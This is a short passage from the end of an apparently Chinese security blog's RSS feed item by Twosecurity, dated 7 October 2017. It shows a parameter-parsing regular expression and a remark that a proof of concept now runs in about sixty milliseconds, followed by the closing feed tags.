lang=&quot;text&quot;&gt;/([^\=\*\s]+)(\*)?\s*\=\s*(?:([^;&#39;\s]+\&#39;[\w-]*\&#39;[^;\s]+)|(?:\&quot;([^&quot;]*)\&quot;)|([^;\s]*))(?:(?:\s*;\s*)|(?:\s*$))/g&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;现在，执行一次 PoC 仅需六十多毫秒，终于大功告成了！&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-10-07-29920988</guid>
<pubDate>Sat, 07 Oct 2017 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
